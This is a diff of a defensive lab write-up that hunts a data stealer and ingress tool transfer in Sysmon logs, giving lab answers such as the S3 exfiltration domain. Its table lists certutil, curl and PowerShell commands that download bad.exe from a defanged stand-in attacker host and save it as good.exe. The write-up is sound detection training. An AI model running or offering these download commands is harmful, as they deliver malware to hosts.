@@ -63,7 +63,7 @@ Detecting Discovery 
 - When a command is executed in the command prompt, they are logged as new processes.  
     
 
-Questions  
+**Questions**  
 
 **1. Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?**  
 - Let's execute the invoice.pdf.exe first so it can be logged in the Sysmon logs to review the commands.  
@@ -180,7 +180,7 @@ Data Stealers
 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/171.png) 
 
-1. Looking at the Sysmon logs, what directory does the stealer create? 
+**1. Looking at the Sysmon logs, what directory does the stealer create?** 
 - Let take a look at Sysmon Logs and filter to stealer.exe to determine which directory was created. (Event Viewer > Application and Services Logs > Microsoft > Windows > Sysmon > Operational) 
 - Filter to Event ID 1 (Process Creation) 
     
@@ -191,7 +191,7 @@ Data Stealers
 
 Answer: staging_58f1 
 
-2. Which three file extensions does the malware search for? 
+**2. Which three file extensions does the malware search for?** 
 - Let's follow the execution staging of the stealer to determine the file extensions. 
     
 
@@ -203,7 +203,7 @@ Answer: staging_58f1 
 
 Answer: docx, pdf, xlsx 
 
-3. Which PowerShell cmdlet does the malware use to get clipboard content?  
+**3. Which PowerShell cmdlet does the malware use to get clipboard content?**  
 - We should still be in the Event ID 1 (Process Creation) 
 - Look for anything associated with cmdlet, clipboard, and cmdlet.
 
@@ -211,14 +211,15 @@ Answer: docx, pdf, xlsx 
 
 Answer: Get-ClipBoard 
 
-4. Which domain does the malware exfiltrate the data?  
+**4. Which domain does the malware exfiltrate the data?**  
 - Here, we need to filter to Event ID 22 (DNS) 
 
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/177.png)
 
 Answer: collecteddata-storage-2025.s3.amazonaws.com 
 
-Ingress Tool Transfer 
+Ingress Tool Transfer
+---
 
 - Some adversaries may need to download additional tools to achieve their goals. 
 1. A script to automate Discovery and find common vulnerabilities ([GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)) 
@@ -228,15 +229,17 @@ Ingress Tool Transfer 
 	- Tactic: Command and Control
 		- An adversary may transfer tools or other files from an external system into a compromised environment. tools may be copied from an external adversary0controlled system to the targets network through the Command and Control Channel (FTP,SCP or HTTP). 
     
-Common Transfer Methods 
+Common Transfer Methods
+---
 
 |   |   |
 |---|---|
-|Ingress Tool Transfer Command|Common CMD / PowerShell Commands|
-|Via Certutil|certutil.exe -urlcache -f [hxxps://blackhat[.]thm/bad[.]exe] good.exe|
-|Via Curl (Windows 10+)|curl.exe [hxxps://blackhat[.]thm/bad[.]exe] -o good.exe|
-|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|powershell -c "Invoke-WebRequest -Uri '[hxxps://blackhat[.]thm/bad[.]exe]' -OutFile 'good.exe'"|
+|**Ingress Tool Transfer Command**|**Common CMD / PowerShell Commands**|
+|Via Certutil|`certutil.exe -urlcache -f [hxxps://blackhat[.]thm/bad[.]exe] good.exe`|
+|Via Curl (Windows 10+)|`curl.exe [hxxps://blackhat[.]thm/bad[.]exe] -o good.exe`|
+|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|`powershell -c "Invoke-WebRequest -Uri '[hxxps://blackhat[.]thm/bad[.]exe]' -OutFile 'good.exe'"`|
 |Via Graphical Interface|No need to use CMD, just copy-paste malware via RDP or download them via a web browser!|
 
-Detecting Tools Transfer 
+Detecting Tools Transfer
+---
 - Since transfers do require a network connection, Event ID’s 1, 11, 22 can be the Go-To filters to analyze what was tools executed within the network.
